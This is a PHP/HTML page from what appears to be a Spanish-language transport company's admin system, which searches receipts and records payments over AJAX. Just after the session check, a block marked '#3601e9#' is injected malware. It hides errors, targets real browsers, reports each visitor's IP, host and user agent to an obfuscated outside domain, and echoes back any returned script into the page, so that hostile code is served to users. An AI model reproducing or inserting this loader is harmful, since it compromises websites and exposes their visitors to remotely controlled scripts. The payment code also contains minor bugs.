<?php 
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	
	require("../conexion/ajax.php");
?>
<?php
#3601e9#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/3601e9#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function validarBuscar()
	{
		agregarCargando('cargando');
		comp = document.getElementById("textComp").value;
		//compA = parseInt(comp);
		
		if(comp.length==0)
		{
			alert("¡ Debe ingresar un codigo de comprobante !");
			quitarCargando('cargando');
			return;			
		}
		/*else if(compA.toString().length!=comp.length)
		{
			alert("¡ El codigo del comprobante debe ser un numero entero !");
			quitarCargando('cargando');
			return;			
		}*/
		
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=buscarComp&clave=" + comp + "&tipo=Numero";
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{			
					resp = _obj.responseText;	
					if(resp=="notFound")
					{
						alert("¡ Comprobante no encontrado !");
						document.getElementById("textComp").value = "";
						document.getElementById("textMonto").value = "";												
						document.getElementById("cliente").innerHTML = "";
						document.getElementById("serie").innerHTML = "";
						document.getElementById("numero").innerHTML = "";
						document.getElementById("total").innerHTML = "";
						document.getElementById("fecha").innerHTML = "";
						document.getElementById("tipo").innerHTML = "";
						document.getElementById("saldo").innerHTML = "";
						quitarCargando('cargando');
					}
					else
					{
						//agregar informacion	
						//alert("Exito: " + resp);
						resp = resp.split("*");
						saldo = resp[10];
						estadoP=resp[11];											
						document.getElementById("monto").innerHTML = "<label><input name=\"textMonto\" type=\"text\" id=\"textMonto\"/></label>";
						document.getElementById("cliente").innerHTML = resp[0];
						document.getElementById("serie").innerHTML = resp[1];
						document.getElementById("numero").innerHTML = resp[2];
						document.getElementById("total").innerHTML = resp[3];
						document.getElementById("fecha").innerHTML = resp[4];
						document.getElementById("tipo").innerHTML = resp[5];						
						document.getElementById("saldo").innerHTML = saldo;	
						if(saldo==0 || estadoP=="Cancelado")
						{
							document.getElementById("monto").innerHTML = "--------------------";
							alert("¡ Ya se encuentra Cancelado completamente el comprobante, el saldo es 0 !");
						}																														
						quitarCargando('cargando');						
					}
				}
			}
		}
	}
	
	function validarPagar()
	{
		agregarCargando('cargando');
		if(document.getElementById("monto").innerHTML=="--------------------")
		{
			alert("¡ Operacion no permitida !");
			quitarCargando('cargando');
			return;	
		}
		comp = document.getElementById("textComp").value;
		//compA = parseInt(comp);		
		monto = document.getElementById("textMonto").value;		
		saldo = document.getElementById("saldo").innerHTML;	
		total = parseFloat(total);
		estado="Cobranza";	
		//alert("Saldo: " + saldo);
		if(comp.length==0 || monto.length==0)
		{
			alert("¡ Se debe llenar todo los campos !");
			quitarCargando('cargando');
			return;			
		}
		/*else if(compA.toString().length!=comp.length)
		{
			alert("¡ El codigo del comprobante debe ser un numero entero !");
			quitarCargando('cargando');
			return;			
		}*/
		else if(isNaN(monto))
		{
			alert("¡ El monto debe ser un numero !");
			quitarCargando('cargando');
			return;			
		}
		else if(parseFloat(monto)>parseFloat(saldo))
		{
			alert("¡ El monto a pagar no puede ser mayor al saldo !");
			quitarCargando('cargando');
			return;			
		}
		if(parseFloat(monto)==parseFloat(saldo))
		{
			estado="Cancelado;"
			saldo=0;
		}
		//ajax
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=pagarComp&clave=" + comp + "&monto=" + monto + "&estado="+estado+"&saldo="+saldo;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{			
					resp = _obj.responseText;
					//alert(resp);
					//quitarCargando('cargando');						
					if(resp=="exito")
					{
						alert("¡ Pago realizado satisfactoriamente !");
						document.getElementById("textComp").value = "";
						document.getElementById("textMonto").value = "";												
						document.getElementById("cliente").innerHTML = "";
						document.getElementById("serie").innerHTML = "";
						document.getElementById("numero").innerHTML = "";
						document.getElementById("total").innerHTML = "";
						document.getElementById("fecha").innerHTML = "";
						document.getElementById("tipo").innerHTML = "";
						document.getElementById("saldo").innerHTML = "";
						quitarCargando('cargando');						
					}
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Mar&iacute;n - pagarComprobante  ::</title>
<style type="text/css">
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post" action="">
          <p align="center"><strong>PAGAR COMPROBANTE </strong></p>
          <table width="501" border="0" align="center">
            <tr>
              <th width="203" height="35" scope="col"><div align="justify"><em><strong>Codigo Comprobante : </strong></em></div></th>
              <th width="190" scope="col"><div align="justify">
                <label>
                <input name="textComp" type="text" id="textComp" />
                </label>
              </div></th>
              <th width="76" scope="col">&nbsp;</th>
            </tr>
            <tr>
              <td height="47"><div align="justify"></div></td>
              <td><div align="justify">
                <label>
                <input name="Buscar" type="button" id="Buscar" value="Buscar"  onclick="validarBuscar()"/>
                </label>
              </div></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="30"><div align="justify"><em><strong>Cliente : </strong></em></div></td>
              <td><div align="justify" id="cliente"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31"><div align="justify"><em><strong>Serie : </strong></em></div></td>
              <td><div align="justify" id="serie"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31"><div align="justify"><em><strong>N&uacute;mero : </strong></em></div></td>
              <td><div align="justify" id="numero"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31"><div align="justify"><em><strong>Fecha : </strong></em></div></td>
              <td><div align="justify" id="fecha"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="30"><div align="justify"><em><strong>Tipo :</strong></em></div></td>
              <td><div align="justify" id="tipo"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="37"><div align="justify"><em><strong>Total : </strong></em></div></td>
              <td><div align="justify" id="total"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="29"><div align="justify"><em><strong>Saldo : </strong></em></div></td>
              <td><div align="justify" id="saldo"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="35"><div align="justify"><em><strong>Monto :</strong></em></div></td>
              <td><div align="justify" id="monto">
                <label>
                <input name="textMonto" type="text" id="textMonto" />
                </label>
              </div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="21">&nbsp;</td>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="37"><div align="center">
                <input name="Pagar" type="button" id="Pagar" value="Pagar" onClick="validarPagar()"/>
              </div></td>
              <td><div align="center">
                <label>
                <input name="Terminar" type="button" id="Terminar" value="Terminar" onClick="go()"/>
                </label>
              </div></td>
              <td>&nbsp;</td>
            </tr>
          </table>
          </form>        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>
